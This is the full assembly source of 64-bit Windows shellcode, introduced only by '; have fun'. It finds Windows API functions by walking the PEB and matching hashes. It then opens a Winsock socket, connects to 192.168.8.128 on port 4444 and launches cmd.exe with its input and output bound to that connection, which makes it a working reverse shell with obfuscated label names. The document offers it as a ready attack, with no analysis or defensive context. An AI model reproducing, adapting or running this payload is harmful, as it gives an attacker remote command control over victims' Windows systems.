; have fun

bits 64

_start:
    and rsp, -16
    mov r11d, 0xEC0E4E8E        
x7d3p9k2:
    mov rdx, [gs:0x60]     
    mov rdx, [rdx+0x18]      
    mov rdx, [rdx+0x20]     
    mov rdx, [rdx]         
    mov rdx, [rdx]          
    mov rdx, [rdx+0x20]     
    xor r15, r15

    cmp r13b, 1
    je m5q8z2n1.r4y1t9v6

.w3b7c8x0:
    mov eax, [rdx+0x3C]     
    add rax, rdx           

    mov ebx, [rax+0x88]     
    add rbx, rdx           

    mov ecx, [rbx+0x18]      

    mov r8d, [rbx+0x20]      
    add r8, rdx             
 
h2g9l5s3:
    mov esi, [r8 + r15 * 4]    
    add rsi, rdx    
    xor eax, eax
    xor r9, r9      
.j8k1f4d7:
    lodsb   
    test al, al     
    jz .n6z3p2q9   
    ror r9d, 0xd     
    add r9d, eax    
    jmp .j8k1f4d7  
.n6z3p2q9:
    cmp r9d, r11d  
    je .v5m7x4y1       
    inc r15d        
    loop h2g9l5s3  
.v5m7x4y1:
    mov eax, [rbx+0x24]  
    add rax, rdx      
    movzx rcx, word [rax + r15 * 2]    

    mov eax, [rbx+0x1C]      
    add rax, rdx       
    mov eax, [rax + rcx * 4]   
    add rax, rdx        
    cmp r11d, 0x3BFCEDCB   
    je t9r2b6k8
    cmp r11d, 0xADF509D9   
    je d4g1q3n5
    cmp r11d, 0x4E121B69   
    je x2y7w9z4
    cmp r11d, 0xB32DBA0C    
    je p3t5m1v8
    cmp r11d, 0x16B3FE72    
    je b9k4d7x2
loadlib:
    lea rcx, [rel ws2_32]   
    sub rsp, 0x20   
    call rax    
    add rsp, 0x20

    mov rdx, rax
    xor r15, r15
    mov r11d, 0x3BFCEDCB    
    jmp x7d3p9k2.w3b7c8x0

t9r2b6k8:
    push rdx    
    sub rsp, 424    
    mov rcx, 0x202  
    mov rdx, rsp    
    call rax    
    add rsp, 424    
    pop rdx     

    xor r15, r15
    mov r11d, 0xADF509D9        
    jmp x7d3p9k2.w3b7c8x0
d4g1q3n5:
    push rdx    
    sub rsp, 56
    mov rcx, 2
    mov rdx, 1
    mov r8, 6
    xor r9, r9
    mov dword 0x20[rsp], 0
    mov dword 0x28[rsp], 0
    call rax
    mov rdi, rax
    add rsp, 56
    pop rdx
    
    xor r15, r15
    mov r11d, 0x4E121B69        
    jmp x7d3p9k2.w3b7c8x0

x2y7w9z4:
    push rdx
    sub rsp, 0x10
    mov word [rsp], 2
    mov word [rsp+2], 0x5C11
    

    mov cl, 2
    lea rdx, [rel ip]
    lea r8, [rsp+4]
    call rax

    mov r14, rsp    

    add rsp, 0x10
    pop rdx
    xor r15, r15
    mov r11d, 0xB32DBA0C        
    jmp x7d3p9k2.w3b7c8x0

p3t5m1v8:
    sub rsp, 96
    mov rcx, rdi    
    mov rdx, r14    
    mov r8, 16
    xor r9, r9
    mov qword [rsp+32], 0
    mov qword [rsp+40], 0
    mov qword [rsp+48], 0
    call rax
    add rsp, 96

m5q8z2n1:
    mov r13b, 1
    jmp x7d3p9k2    
.r4y1t9v6:
    xor r15, r15
    mov r11d, 0x16B3FE72    
    jmp x7d3p9k2.w3b7c8x0
b9k4d7x2:
    sub rsp, 136
    mov dword [rsp], 112
    mov dword [rsp+60], 0x00000100
    mov qword [rsp+80], rdi
    mov qword [rsp+88], rdi
    mov qword [rsp+96], rdi
    mov r14, rsp 

    sub rsp, 88
    xor rcx, rcx
    lea rdx, [rel cmd]
    xor r8, r8
    xor r9, r9
    mov byte [rsp+32], 1
    mov dword [rsp+40], 0
    mov qword [rsp+48], 0  
    mov qword [rsp+56], 0
    mov rbx, r14
    mov qword [rsp+64], rbx
    lea rbx, [r14+112]
    mov qword [rsp+72], rbx
    call rax
    add rsp, 88
    add rsp, 136
done: 
    ret
ws2_32:
    db "ws2_32", 0
    ; ret
ip:
    db "192.168.8.128", 0
cmd:
    db "cmd", 0
